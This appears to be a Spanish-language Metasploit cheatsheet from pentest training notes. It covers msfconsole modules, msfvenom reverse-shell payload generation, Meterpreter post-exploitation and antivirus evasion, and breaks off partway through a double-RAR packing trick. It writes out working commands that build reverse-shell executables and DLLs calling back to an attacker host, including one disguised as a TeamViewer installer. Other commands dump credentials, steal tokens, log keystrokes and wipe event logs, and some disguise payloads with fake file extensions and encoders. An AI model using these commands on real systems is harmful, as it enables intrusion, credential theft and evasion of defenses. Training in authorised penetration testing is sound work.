# Using the Metasploit Framework — Cheatsheet

> 📋 Cheatsheet de referencia (comandos, tablas, metodología) — **no** es un writeup de laboratorio con capturas. Para los writeups con capturas de Skills Assessments resueltos, ver `$ ls modulos/` en el README principal.

## Contenido

- [Metasploit — Índice, cheatsheet y metodología](#metasploit--índice-cheatsheet-y-metodología)
- [Metasploit Framework (MSF)](#metasploit-framework-msf)
- [Payloads y Encoders](#payloads-y-encoders)
- [Sesiones y Meterpreter](#sesiones-y-meterpreter)
- [MSFvenom](#msfvenom)
- [Evasión de Firewall e IDS/IPS](#evasión-de-firewall-e-idsips)

---

## Metasploit — Índice, cheatsheet y metodología

Nota índice del módulo: enlaces a todas las notas, la **metodología** de una intervención con MSF y la **cheatsheet** completa.

---

### Índice de notas

- **Core (consola)** → **Metasploit** (instalación, módulos, `use`/`set`/`run`, targets, base de datos, importar `.rb`)
- **Payloads** → **Payloads y Encoders**
- **Post-explotación** → **Sesiones y Meterpreter**
- **Payloads independientes** → **MSFvenom**
- **Evasión** → **Evasión de Firewall e IDS-IPS**

---

### Metodología — las 5 fases con MSF

1. **Enumeración** → `db_nmap` (guarda en la BD del workspace).
2. **Preparación** → `search` el módulo → `use` → `show options` → `set/setg RHOSTS/LHOST` → `set payload`.
3. **Explotación** → `check` (opcional) → `run` / `exploit`.
4. **Escalada de privilegios** → `getsystem`, `local_exploit_suggester`, `steal_token`/`incognito`, privescs locales.
5. **Post-explotación** → `hashdump`, `lsa_dump_*`, `sysinfo`/`screenshot`/`upload`/`download`, pivotaje.

> [!TIP]
> **Regla de los payloads**
> **`/` (staged)** necesita `multi/handler`; **`_` (stageless)** se recibe con `nc`. Elige `LPORT=443/80` para camuflar el tráfico.

> [!NOTE]
> **Flujo visual (añadido)**
> ```mermaid
> flowchart TD
>     A["1. Enumeración<br/>db_nmap"] --> B["2. Preparación<br/>search → use → set → set payload"]
>     B --> C["3. Explotación<br/>check → run / exploit"]
>     C --> D["4. Escalada de privilegios<br/>getsystem → local_exploit_suggester → steal_token/incognito"]
>     D --> E["5. Post-explotación<br/>hashdump · screenshot · upload/download · pivotaje"]
> ```

---

### Cheatsheet

#### Consola y módulos
| Comando | Qué hace |
|---------|----------|
| `msfconsole` | Arrancar la consola |
| `show exploits` · `show payloads` · `show auxiliary` | Listar todo el catálogo de ese tipo |
| `search type:exploit platform:windows cve:2021 rank:excellent <x>` | Buscar módulos |
| `use <módulo>` · `info` · `show options` · `show advanced` | Seleccionar / describir / opciones / avanzadas |
| `set <P> <v>` · `setg <P> <v>` | Configurar (módulo / global) |
| `show targets` · `set target <id>` | Ver / forzar target |
| `check` | Comprobar vulnerabilidad sin explotar |
| `run` / `exploit` · `-j`/`-z`/`-e <enc>`/`-h` | Ejecutar · job en 2º plano / sin interactuar / encoder / ayuda |
| `set autorunscript migrate -f` | Auto-migrar de proceso al completar |
| `workspace [-a/-d]` · `db_nmap <opts>` | Workspaces · Nmap en la BD |
| `db_create` · `db_connect` · `db_destroy` | Crear / conectar / borrar la BD |
| `reload_all` | Recargar módulos (tras importar `.rb`) |

#### Payloads y encoders
| Comando | Qué hace |
|---------|----------|
| `show payloads` · `set payload <n>` | Listar / elegir payload |
| `grep <patrón> <comando>` | Filtrar salida de msfconsole |
| `show encoders` | Encoders compatibles |
| `msfvenom -p <payload> LHOST= LPORT= -f <fmt> -o <out>` | Generar payload |
| `-e x86/shikata_ga_nai -i <n>` | Codificar n veces |

#### Sesiones / Meterpreter
| Comando | Qué hace |
|---------|----------|
| `sessions -l/-l -v/-i <n>` · `-s/-c/-u/-K` | Listar / entrar · script o cmd en todas / upgrade / matar todas |
| `help` · `sysinfo` · `ls` · `background` | Ayuda / info SO / ficheros / 2º plano |
| `upload`/`download`/`screenshot`/`reg` · `keyscan_*`/`uictl` | Ficheros, captura, registro · keylogger, control remoto |
| `use sniffer` → `sniffer_start/dump/stop` | Capturar tráfico desde el objetivo |
| `shell` | Shell nativa (desde Meterpreter) |
| `getuid` · `ps` · `migrate <PID>` · `steal_token <PID>` | Identidad / procesos / migrar / robar token |
| `use incognito` → `list_tokens` → `impersonate_token`/`drop_token` | Suite de suplantación de tokens |
| `getsystem` · `getprivs` | Elevar a SYSTEM automático / ver privilegios |
| `use multi/recon/local_exploit_suggester` | Sugerir privescs |
| `hashdump` · `lsa_dump_sam` · `lsa_dump_secrets` | Volcar credenciales |
| `add_user`/`add_group_user`/`clearev`/`timestomp` | Gestión usuarios / antiforense (⚠️ intrusivo) |
| `use exploit/multi/handler` | Recibir payload de msfvenom |

---

## Metasploit Framework (MSF)

**Metasploit Framework** es la plataforma de explotación por excelencia: combina en un mismo entorno la búsqueda de módulos (exploits, auxiliares, post-explotación), la configuración de payloads y la gestión de las sesiones obtenidas.

```bash
sudo apt update && sudo apt install metasploit-framework
```
Instala el framework completo desde los repositorios.

```bash
msfconsole
```
Lanza la **consola interactiva** de Metasploit — el punto de entrada para todo lo demás.

> [!NOTE]
> **Ubicación en el sistema**
> | Ruta | Contenido |
> |------|-----------|
> | `/usr/share/metasploit-framework` | Raíz de la instalación |
> | `/usr/share/metasploit-framework/modules` | Módulos: `auxiliary`, `encoders`, `evasion`, `exploits`, `nops`, `payloads`, `post` |
> | `/usr/share/metasploit-framework/plugins/` | Plugins |
> | `/usr/share/metasploit-framework/scripts/` | Scripts |
> | `/usr/share/metasploit-framework/tools/` | Herramientas auxiliares del framework |

> [!NOTE]
> **Notas relacionadas de este módulo**
> **Payloads y Encoders** · **Sesiones y Meterpreter** · **MSFvenom** · **Evasión de Firewall e IDS-IPS**

---

### Estructura de una intervención con MSF

Cualquier uso de Metasploit en un pentest se divide en cinco fases:

1. **Enumeración**
2. **Preparación**
3. **Explotación**
4. **Escalada de privilegios** (ver **Sesiones y Meterpreter**)
5. **Post-explotación** (ver **Sesiones y Meterpreter**)

---

### Módulos

#### Sintaxis y etiquetas

```
<No.> <type>/<os>/<service>/<name>
```

| Etiqueta | Significado |
|----------|-------------|
| `Tipo` | Ver tabla siguiente |
| `SO` | Sistema operativo y arquitectura para los que se creó el módulo |
| `Servicio` | Servicio vulnerable objetivo (o una categoría general como `gather` en `auxiliary`/`post`) |
| `Nombre` | Acción concreta que realiza el módulo |

**Tipos de módulo:**

| Tipo | Descripción |
|------|-------------|
| `Auxiliary` | Escaneo, fuzzing, sniffing y administración — asistencia y funcionalidad extra |
| `Exploits` | Explotan una vulnerabilidad concreta para entregar un payload |
| `Post` | Recopilación de información, pivotaje más profundo, etc., ya con acceso ganado |

#### Búsqueda de módulos

```bash
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```
Filtra por tipo, plataforma, año del CVE y **`rank`** (fiabilidad/estabilidad del exploit — `excellent` es el más alto).

> [!NOTE]
> **Listar por tipo (añadido)**
> Sin buscar nada concreto, puedes listar **todo el catálogo** de un tipo:
> ```bash
> show exploits     # todos los exploits del framework
> show payloads     # todos los payloads
> show auxiliary    # todos los módulos auxiliares (escaneo, fuzzing, sniffing...)
> ```

---

### Uso de un módulo

```bash
use <número o ruta del módulo>
```
Selecciona el módulo como el activo de la sesión.

```bash
info          # descripción completa: autor, CVE, plataformas, opciones
show options  # parámetros configurables del módulo (y del payload) e indica cuáles son obligatorios
show advanced # opciones avanzadas del módulo (no mostradas por show options)
```

```bash
set RHOSTS <ip>      # define un parámetro SOLO para el módulo actual
setg RHOSTS <ip>     # setg = global: permanente para toda la sesión de msfconsole (persiste al cambiar de módulo)
set LHOST <ip>       # IP del atacante (donde escuchará el payload)
```

```bash
check        # comprueba si el objetivo es vulnerable, SIN explotar (no todos los módulos lo soportan)
run          # ejecuta el módulo (equivalente a 'exploit' en módulos de exploit)
```

> [!TIP]
> **`check` antes de disparar (añadido)**
> `check` verifica la vulnerabilidad sin lanzar el payload — útil para no generar ruido/crashear un servicio si solo quieres confirmar que el módulo aplica.

> [!NOTE]
> **Flags de `exploit` (añadido)**
> En un módulo de tipo exploit, `exploit` es sinónimo de `run` pero admite flags propios:
>
> | Flag | Qué hace |
> |------|----------|
> | `exploit -j` | Ejecuta como **job** en segundo plano (no bloquea la consola) |
> | `exploit -z` | No interactúa con la sesión tras explotar con éxito (la deja en segundo plano) |
> | `exploit -e <encoder>` | Fuerza un encoder concreto para el payload (ej. `-e shikata_ga_nai`) |
> | `exploit -h` | Ayuda del comando |
>
> ```bash
> set autorunscript migrate -f
> ```
> Hace que, **al completarse el exploit**, Meterpreter migre automáticamente a otro proceso — útil para no depender de un proceso inestable (ver **Sesiones y Meterpreter**).

#### Objetivos (targets)

```bash
show targets       # variantes de SO/versión/arquitectura que soporta el exploit (solo dentro de un 'use')
set target <id>    # fuerza un target concreto (cuando la autodetección falla o quieres una variante específica)
```

---

### Base de datos: workspaces y db_nmap

```bash
workspace           # listar workspaces (separan hosts/credenciales/sesiones por proyecto)
workspace -a <n>    # crear/añadir un workspace
workspace -d <n>    # borrarlo
```

```bash
db_nmap <opciones de nmap>
```
Ejecuta Nmap **desde dentro de `msfconsole`**, guardando automáticamente hosts/puertos/servicios en la BD del workspace activo → quedan disponibles para otros módulos sin reintroducir `RHOSTS`.

> [!NOTE]
> **Crear/conectar/borrar la base de datos manualmente (añadido)**
> `workspace` ya gestiona esto en la práctica (Metasploit crea la BD de PostgreSQL automáticamente al iniciar el servicio), pero existen los comandos explícitos para **ataques dirigidos por base de datos**:
> ```bash
> db_create <nombre>     # crear y conectar una BD nueva (ej. db_create autopwn)
> db_connect <nombre>    # conectar a una BD ya existente
> db_destroy             # borrar la BD actual
> db_destroy <user:password@host:port/database>   # borrar una BD remota con credenciales explícitas
> ```

---

### Importar módulos externos (.rb)

Para usar un exploit que no viene de serie (p. ej. de [Exploit-DB](https://www.exploit-db.com/)), se descarga el `.rb` y se coloca en el directorio de módulos.

```bash
# ~/.msf4/ es la copia enlazada (symlink) en tu home; puede no tener toda la estructura de carpetas
mkdir -p ~/.msf4/modules/exploits/<ruta_adecuada>
cp exploit.rb ~/.msf4/modules/exploits/<ruta_adecuada>/
```
```bash
reload_all    # recarga todos los módulos para que msfconsole encuentre el nuevo
```

> [!NOTE]
> El directorio principal de módulos es `/usr/share/metasploit-framework`; las carpetas críticas están **enlazadas (symlink)** en `~/.msf4/`. Solo tienes que recrear con `mkdir` la estructura que falte para que la ruta coincida con la original, copiar el `.rb` y hacer `reload_all`.

---

### Resumen rápido (cheatsheet)

| Comando | Qué hace |
|---------|----------|
| `msfconsole` | Arrancar la consola |
| `show exploits` / `show payloads` / `show auxiliary` | Listar todo el catálogo de ese tipo |
| `search type:exploit platform:windows cve:2021 rank:excellent <palabra>` | Buscar módulos filtrando |
| `use <módulo>` | Seleccionar módulo activo |
| `info` / `show options` / `show advanced` | Ver descripción / parámetros / opciones avanzadas |
| `set <PARAM> <valor>` / `setg <PARAM> <valor>` | Configurar (solo módulo / global) |
| `show targets` / `set target <id>` | Ver / forzar el target |
| `check` | Comprobar si es vulnerable sin explotar |
| `run` / `exploit` | Ejecutar el módulo |
| `exploit -j` / `-z` / `-e <encoder>` / `-h` | Job en segundo plano / no interactuar / forzar encoder / ayuda |
| `set autorunscript migrate -f` | Auto-migrar de proceso al completar el exploit |
| `workspace` / `-a` / `-d` | Listar / crear / borrar workspaces |
| `db_nmap <opciones>` | Nmap dentro de msfconsole, guardando en la BD |
| `db_create` / `db_connect` / `db_destroy` | Crear / conectar / borrar la base de datos |
| `reload_all` | Recargar módulos (tras importar un `.rb`) |

---

## Payloads y Encoders

Parte del módulo **Metasploit**. Aquí: elegir y configurar el **payload** que entrega el exploit, y los **encoders** que lo ofuscan.

---

### Payloads

Un **payload** es el módulo que, tras la explotación exitosa, entrega el "premio" al atacante (normalmente una shell). El *exploit* vulnera el servicio; el *payload* es el código que se ejecuta después en el objetivo, típicamente estableciendo una conexión de vuelta.

```bash
show payloads                 # payloads compatibles con el exploit activo
grep meterpreter show payloads  # 'grep' interno de msfconsole: filtra la salida de un comando
set payload <número>          # selecciona el payload por su índice del listado
```

> [!NOTE]
> **`grep` de msfconsole**
> `grep <patrón> <comando>` es un comando **interno de msfconsole** (no el del shell): ejecuta el comando y filtra su salida. Útil para no leer listados larguísimos.

#### Parámetros a configurar

**Del exploit** (ejemplo SMB):

| Parámetro | Descripción |
|-----------|-------------|
| `RHOSTS` | IP del host remoto (objetivo) |
| `RPORT` | Puerto del servicio vulnerable (suele venir bien por defecto: 445 para SMB) |

**Del payload:**

| Parámetro | Descripción |
|-----------|-------------|
| `LHOST` | IP del atacante (donde escucha la conexión de vuelta) |
| `LPORT` | Puerto de escucha (verificar que no esté en uso) |

---

### Tipos de payload

| Payload | Descripción |
|---------|-------------|
| `generic/custom` | Listener genérico, multiuso |
| `generic/shell_bind_tcp` | Shell normal, bind TCP |
| `generic/shell_reverse_tcp` | Shell normal, reverse TCP |
| `windows/x64/exec` | Ejecuta un comando arbitrario |
| `windows/x64/loadlibrary` | Carga una DLL arbitraria |
| `windows/x64/messagebox` | Muestra un `MessageBox` personalizable |
| `windows/x64/shell_reverse_tcp` | Shell normal, **payload único** (sin stager), reverse TCP |
| `windows/x64/shell/reverse_tcp` | Shell normal, **stager + stage**, reverse TCP |
| `windows/x64/shell/bind_ipv6_tcp` | Shell, stager+stage, bind sobre IPv6 |
| `windows/x64/meterpreter/$` | Payload de **Meterpreter** (con las variantes anteriores) |
| `windows/x64/powershell/$` | Sesión interactiva de PowerShell |
| `windows/x64/vncinject/$` | Servidor VNC vía inyección reflectiva |

> [!NOTE]
> **Payload único vs. stager+stage**
> - **Único** (`shell_reverse_tcp`, guion bajo) → todo el código en un solo bloque. Funciona con un simple `nc`.
> - **Stager+stage** (`shell/reverse_tcp`, barra) → el **stager** es pequeño (cabe en exploits con poco espacio) y, al conectar, descarga el **stage** completo (más funcionalidad, como Meterpreter). Necesita un handler de Metasploit.

> [!TIP]
> La distinción **`_` (stageless) vs `/` (staged)** es clave: staged casi siempre requiere `multi/handler`; stageless puede recibirse con `nc`. Ver **Sesiones y Meterpreter** y **MSFvenom**.

---

### Encoders

Los **encoders** transforman el payload para adaptarlo a distintas arquitecturas o para evitar que ciertos caracteres/firmas rompan el exploit (o disparen un AV básico). Arquitecturas: `x64` · `x86` · `sparc` · `ppc` · `mips`.

```bash
set payload <número>
show encoders     # encoders compatibles con la combinación exploit + payload
```

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```
Genera el payload y lo pasa por el encoder **`x86/shikata_ga_nai`** (`-e`) **10 veces** (`-i 10`): cada iteración añade una capa distinta, dificultando la detección por firma estática. `-f exe` lo empaqueta como ejecutable y `-o` es el fichero de salida.

> [!WARNING]
> **Los encoders NO son "AV bypass" mágico**
> `shikata_ga_nai` con varias iteraciones evade firmas estáticas simples, pero los AV/EDR modernos usan **heurística y análisis de comportamiento**. No confíes en el encoder como única evasión (ver **Evasión de Firewall e IDS-IPS**).

---

### Resumen rápido (cheatsheet)

| Comando | Qué hace |
|---------|----------|
| `show payloads` | Payloads compatibles con el exploit |
| `grep <patrón> <comando>` | Filtrar la salida de un comando de msfconsole |
| `set payload <número>` | Seleccionar payload por índice |
| `show encoders` | Encoders compatibles con exploit+payload |
| `msfvenom ... -e x86/shikata_ga_nai -i <n>` | Codificar un payload n veces |
| `_` (stageless) vs `/` (staged) | Único (nc) vs stager+stage (multi/handler) |

---

## Sesiones y Meterpreter

Parte del módulo **Metasploit**. Qué hacer **una vez que un exploit ha tenido éxito**: gestionar sesiones, moverse con Meterpreter, migrar de proceso, escalar privilegios y volcar credenciales.

---

### Sesiones

```bash
sessions          # listar sesiones activas
sessions -i <n>   # interactuar con la sesión número n
```

> [!NOTE]
> **Más flags de `sessions` (añadido)**
> Útiles cuando manejas **varias sesiones a la vez**:
>
> | Flag | Qué hace |
> |------|----------|
> | `sessions -l` | Listar sesiones disponibles |
> | `sessions -l -v` | Listado **verboso** (incluye, p. ej., qué vulnerabilidad se usó para explotar) |
> | `sessions -s <script>` | Ejecutar un script de Meterpreter en **todas** las sesiones activas |
> | `sessions -c <cmd>` | Ejecutar un comando en **todas** las sesiones Meterpreter activas |
> | `sessions -u <ID>` | Mejorar (*upgrade*) una shell Win32 normal a sesión Meterpreter |
> | `sessions -K` | Matar **todas** las sesiones activas |

---

### Comandos básicos de Meterpreter (añadido)

Una vez dentro de una sesión Meterpreter, estos son los comandos de **reconocimiento y manejo básico** más usados — antes de entrar en migración de tokens o post-explotación avanzada:

```bash
help              # ayuda de Meterpreter (lista todos los comandos disponibles)
sysinfo           # información del sistema comprometido (SO, arquitectura, dominio)
ls                # listar ficheros/carpetas del directorio actual en el objetivo
use priv          # cargar la extensión 'priv' (librerías extra de privilegios)
background        # dejar la sesión actual en segundo plano sin cerrarla
run <script>      # ejecutar un script de Meterpreter (ver scripts/meterpreter/ en la instalación)
```

| Comando | Qué hace |
|---------|----------|
| `upload <fichero>` | Subir un fichero al objetivo |
| `download <fichero>` | Descargar un fichero del objetivo |
| `screenshot` | Captura de pantalla del objetivo |
| `setdesktop <n>` | Cambiar al escritorio de otra sesión de usuario conectada |
| `keyscan_start` / `keyscan_dump` / `keyscan_stop` | Iniciar / volcar / detener el **sniffer de teclado** |
| `uictl enable <keyboard/mouse>` | Tomar control del teclado y/o ratón del objetivo |
| `reg <comando>` | Interactuar con el registro de Windows (crear, borrar, consultar, `set`...) |
| `add_user <user> <pass> -h <ip>` | Crear un usuario en el objetivo |
| `add_group_user "Domain Admins" <user> -h <ip>` | Meter un usuario en **Administradores del dominio** |
| `clearev` | Limpiar el **log de eventos** del objetivo |
| `timestomp` | Cambiar atributos de fecha de un fichero (antiforense) |
| `reboot` | Reiniciar el objetivo |

> [!WARNING]
> **Ruido y evidencia**
> `add_user`/`add_group_user`, `clearev` y `timestomp` son acciones **muy intrusivas** (modifican el sistema o intentan borrar rastro): en un pentest real van sujetas al alcance (*scope*) acordado con el cliente y se documentan siempre, aunque borres el log.

#### Sniffer de red (extensión `sniffer`)

```bash
use sniffer                           # cargar el módulo sniffer
sniffer_interfaces                    # listar interfaces disponibles en el objetivo
sniffer_start <interfaceID> <buffer>  # empezar a capturar (con tamaño de buffer opcional)
sniffer_stats <interfaceID>           # estadísticas de la captura en curso
sniffer_dump <interfaceID> <nombre.pcap>  # volcar lo capturado a un .pcap
sniffer_stop <interfaceID>            # detener la captura
```
Permite capturar tráfico de red **desde el propio objetivo comprometido** sin subir herramientas externas.

---

### Obtener una shell del sistema

```bash
shell
```
Dentro de una sesión **Meterpreter**, abre una shell nativa del host comprometido. Crea un **`Channel`** (p. ej. "Channel 1 created") que representa la conexión TCP inversa.

> [!NOTE]
> **Stager + stage**
> Meterpreter se entrega en dos partes: el **stager** se ejecuta primero en el atacante (esperando la conexión) y, cuando la víctima conecta, se transmite el **stage** (el Meterpreter completo). Ver **Payloads y Encoders**.

---

### Migración de proceso (robar token)

```bash
getuid            # ver con qué usuario corre la sesión actual
ps                # listar procesos (con su PID y el usuario dueño)
migrate <PID>     # migrar la sesión Meterpreter a ese proceso
steal_token 1836  # robar el token de acceso del proceso con ese PID
```

> [!TIP]
> `getuid` te dice quién eres; `ps` te muestra procesos de **otros usuarios** (a veces con más privilegios); `migrate <PID>` mueve tu sesión Meterpreter a un proceso más estable o con otro usuario; `steal_token <PID>` suplanta el token de ese proceso → puedes heredar los privilegios de su dueño sin migrar.

#### Suite completa de tokens — extensión `incognito` (añadido)

```bash
use incognito          # carga las funciones de robo/suplantación de tokens
list_tokens -u          # listar tokens disponibles por usuario
list_tokens -g          # listar tokens disponibles por grupo
impersonate_token <DOMINIO\USUARIO>   # suplantar un token ya listado
steal_token <PID>       # robar y suplantar el token de un proceso concreto
drop_token               # dejar de suplantar, volver al token original
rev2self                 # volver al usuario original con el que comprometiste el objetivo
```

> [!NOTE]
> **`impersonate_token` vs `steal_token`**
> `impersonate_token` suplanta un token que **ya ves** con `list_tokens`; `steal_token` va directo al **proceso** y le roba el suyo (no hace falta listarlo antes). Ambos requieren haber cargado `use incognito`. `drop_token`/`rev2self` son el camino de vuelta.

---

### Elevación rápida con `getsystem` (añadido)

```bash
getsystem
```
Intenta elevar automáticamente a **privilegios SYSTEM** probando varias técnicas conocidas (named pipe impersonation, token duplication, etc.) sin que tengas que elegir exploit. Es lo primero que se prueba en Windows antes de ir a un privesc local más elaborado.

```bash
getprivs
```
Tras elevar (o en general), muestra **todos los privilegios** que tiene la sesión actual (`SeDebugPrivilege`, `SeImpersonatePrivilege`...).

> [!TIP]
> **Orden habitual**
> `getsystem` (rápido, prueba varias técnicas) → si falla, `local_exploit_suggester` (ver abajo) → si tampoco, enumeración manual. No sustituye a entender **por qué** funciona cada técnica, pero es el primer intento casi siempre.

---

### Escalada de privilegios

```bash
use multi/recon/local_exploit_suggester
```
Módulo post que **sugiere exploits locales** aplicables a la sesión actual (según SO, versión y parches).

```bash
use exploit/windows/local/ms15_051_client_copy_images   # privesc conocido (MS15-051)
search kitrap0d                                          # buscar el exploit KiTrap0d (windows)
```

> [!TIP]
> El flujo típico de privesc con MSF: `local_exploit_suggester` → eliges un candidato → lo `use`/`set SESSION <n>`/`run`. `ms15_051` y `kitrap0d` son privescs locales clásicos de Windows.

---

### Volcado de credenciales (post-explotación)

Con privilegios de SYSTEM/admin en la sesión Meterpreter:

```bash
hashdump          # volcar los hashes NTLM de la base de datos SAM
lsa_dump_sam      # volcar la SAM vía secretos LSA
lsa_dump_secrets  # volcar los secretos LSA (credenciales de servicios, cuentas cacheadas...)
```

> [!WARNING]
> Estos comandos requieren privilegios elevados (SYSTEM). Los hashes volcados se **crackean offline** (hashcat) o se reutilizan con **pass-the-hash**.

---

### multi/handler (recibir un payload manual)

Cuando generas un payload con **MSFvenom** (fuera de un exploit), necesitas un **handler** que reciba la conexión:

```bash
use exploit/multi/handler
set payload windows/x86/meterpreter_reverse_tcp
set LHOST 10.10.14.2
set LPORT 8080
run
```

> [!NOTE]
> El handler debe usar **el mismo payload, LHOST y LPORT** con los que generaste el binario. Para payloads **staged** (`/`) es obligatorio; para **stageless** (`_`) basta un `nc`.

---

### Resumen rápido (cheatsheet)

| Comando | Qué hace |
|---------|----------|
| `sessions -l` / `-l -v` / `-i <n>` | Listar / listar verboso / entrar a una sesión |
| `sessions -s <script>` / `-c <cmd>` / `-u <ID>` / `-K` | Script o comando en todas / upgrade a Meterpreter / matar todas |
| `help` / `sysinfo` / `ls` / `background` | Ayuda / info del SO / listar ficheros / segundo plano |
| `upload` / `download` / `screenshot` / `reg` | Subir / bajar fichero / captura / registro |
| `keyscan_start/dump/stop` / `uictl enable` | Keylogger / control teclado-ratón |
| `use sniffer` → `sniffer_start/dump/stop` | Capturar tráfico desde el objetivo |
| `add_user` / `add_group_user` / `clearev` / `timestomp` / `reboot` | Gestión de usuarios y antiforense (⚠️ intrusivo) |
| `shell` | Shell nativa del host (desde Meterpreter) |
| `getuid` / `ps` / `migrate <PID>` / `steal_token <PID>` | Identidad / procesos / migrar / robar token |
| `use incognito` → `list_tokens -u/-g` → `impersonate_token` / `drop_token` | Suite completa de suplantación de tokens |
| `getsystem` / `getprivs` | Elevar a SYSTEM automáticamente / ver privilegios |
| `use multi/recon/local_exploit_suggester` | Sugerir exploits locales de privesc |
| `exploit/windows/local/ms15_051_client_copy_images` | Privesc MS15-051 |
| `hashdump` / `lsa_dump_sam` / `lsa_dump_secrets` | Volcar hashes / SAM / secretos LSA |
| `use exploit/multi/handler` | Recibir un payload generado con msfvenom |

---

## MSFvenom

Parte del módulo **Metasploit**. **MSFvenom** genera payloads independientes (fuera de un exploit) para dejarlos en el objetivo y recibirlos con un listener/**multi/handler**.

---

### Generar un payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```
`-p` payload · `LHOST`/`LPORT` datos del listener · `-f` formato de salida · `> fichero`.

---

### Desglose del comando (partes intercambiables)

```bash
msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
```

#### Payload — `windows/x86/meterpreter_reverse_tcp`

Define qué hace el binario al ejecutarse en la víctima.

| Parte | Significado |
|-------|-------------|
| `windows` | Sistema operativo objetivo |
| `x86` | Arquitectura 32 bits |
| `meterpreter_reverse_tcp` | Stageless (guion bajo) — la víctima se conecta a ti |

Puedes cambiarlo por:
```
windows/x64/meterpreter_reverse_tcp   → Windows 64 bits (más común hoy)
windows/x64/shell_reverse_tcp         → shell básica sin Meterpreter
linux/x64/shell_reverse_tcp           → víctimas Linux
java/jsp_shell_reverse_tcp            → Tomcat (genera .war)
```

**Staged vs Stageless:**
```
windows/x64/shell/reverse_tcp   → staged (barra) — necesita handler de Metasploit
windows/x64/shell_reverse_tcp   → stageless (guion bajo) — funciona con nc
```

#### LHOST — tu IP (a la que se conecta la víctima)
```
LHOST=10.10.14.2       → tu IP de VPN en HTB
LHOST=192.168.1.100    → tu IP en red local (lab propio)
```

#### LPORT — puerto de escucha
```
LPORT=4444
LPORT=443     → recomendado para evadir firewalls (parece HTTPS)
LPORT=80      → recomendado para evadir firewalls (parece HTTP)
```

#### `-k` — Keep (mantener el proceso original)
Intenta que el proceso donde se inyecta el payload siga funcionando con normalidad mientras el payload corre en un hilo aparte. Útil para no levantar sospechas.

#### `-e` — Encoder `x86/shikata_ga_nai`
Ofusca el payload para intentar evadir firmas de AV. `shikata_ga_nai` es **polimórfico** (cada generación produce bytes distintos).
```bash
msfvenom --list encoders    # ver todos
```
```
x86/shikata_ga_nai          → el más usado, polimórfico
cmd/powershell_base64       → para payloads PowerShell
```
> [!WARNING]
> Los AV modernos detectan `shikata_ga_nai` aunque iteres muchas veces. Para evasión real: Veil, Shellter o payloads custom. Ver **Evasión de Firewall e IDS-IPS**.

#### `-a` — Arquitectura
```
-a x86   → 32 bits
-a x64   → 64 bits (Windows moderno casi siempre es x64)
```
Si no lo especificas, msfvenom lo deduce del payload.

#### `--platform` — Plataforma objetivo
```
--platform windows | linux | osx | java
```

#### `-o` — Fichero de salida
```
-o ~/test.js     → extensión .js para camuflar (sigue siendo un ejecutable Windows)
-o ~/shell.exe   → ejecutable directo
-o ~/shell.dll   → DLL para inyección
-o ~/shell.war   → Tomcat
-o ~/shell.elf   → Linux
```
> [!TIP]
> Usar una extensión inesperada (`.js`, `.pdf`, `.txt`) es camuflaje básico.

#### `-i` — Iteraciones del encoder
```
-i 1    → una pasada (mínimo)
-i 5    → balance habitual
-i 10   → más ofuscación, mayor tamaño
```

---

### Listener necesario

```bash
# Stageless (guion bajo) → basta nc
nc -lvnp 8080
```
```bash
# Staged (barra) o meterpreter → multi/handler
msfconsole
use exploit/multi/handler
set payload windows/x86/meterpreter_reverse_tcp
set LHOST 10.10.14.2
set LPORT 8080
run
```

---

### Variantes comunes

```bash
# Windows x64, shell básica, compatible con nc
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=444 -f exe > shell.exe

# Windows x64, Meterpreter, con encoder
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=444 -e x86/shikata_ga_nai -i 5 -f exe > shell.exe

# Linux x64
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=444 -f elf > shell.elf && chmod +x shell.elf

# WAR para Tomcat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=444 -f war > shell.war

# DLL para inyección
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=444 -f dll > evil.dll
```

---

### Resumen rápido (cheatsheet)

| Concepto | Clave |
|----------|-------|
| Generar | `msfvenom -p <payload> LHOST=<IP> LPORT=<p> -f <fmt> -o <out>` |
| Staged vs Stageless | `/` (barra) = staged (multi/handler) · `_` = stageless (nc) |
| Encoder | `-e x86/shikata_ga_nai -i <n>` (ofuscación por firma; no evade EDR) |
| Camuflaje | extensión `.js`/`.pdf` · `LPORT=443/80` |
| Recibir | `nc -lvnp` (stageless) / `multi/handler` (staged) |

---

## Evasión de Firewall e IDS/IPS

Parte del módulo **Metasploit**. Conceptos de las defensas que hay que esquivar al entregar un payload, y por qué los encoders no bastan.

---

### Tipos de protección

- **Protección de endpoint** (*Endpoint protection*): dispositivo o servicio localizado cuyo único propósito es **proteger un único host** (un PC personal, una estación de trabajo corporativa o un servidor en la **DMZ**). Ej.: el antivirus del propio host.
- **Protección perimetral** (*Perimeter protection*): dispositivos físicos o virtualizados en el **borde de la red** (*edge devices*) que controlan el acceso del **exterior (público)** al **interior (privado)**. Ej.: firewall/IDS/IPS de red.

---

### Políticas de seguridad

| Política | Descripción |
|----------|-------------|
| **Detección basada en firmas** (*Signature-based detection*) | Compara los paquetes/ficheros con **patrones de ataque conocidos** (firmas). Una coincidencia del 100% genera alarma. |

La mayoría del **antivirus basado en host** se apoya principalmente en la detección por firmas: las firmas van en el motor AV, que escanea almacenamiento y procesos en ejecución buscando coincidencias. Cuando detecta software malicioso, lo suele **poner en cuarentena** y terminar el proceso.

> [!TIP]
> **Implicación para el ofensivo**
> Como la detección por firmas busca **patrones conocidos**, ofuscar/modificar el payload (encoders, cifrado, payloads custom) puede evadirla. Pero los **EDR modernos** añaden **heurística y análisis de comportamiento**, que no se esquivan solo cambiando bytes → ver la advertencia de los encoders en **Payloads y Encoders** y **MSFvenom**.

---

### Empaquetado con RAR doble (evadir AV estático)

Técnica sencilla para esconder el payload (ej. `test.js` de **MSFvenom**) del AV: meterlo en **dos RAR cifrados con contraseña, anidados y sin extensión**, para que el motor no pueda escanear su contenido.

#### 1. Instalar RAR en Linux
```bash
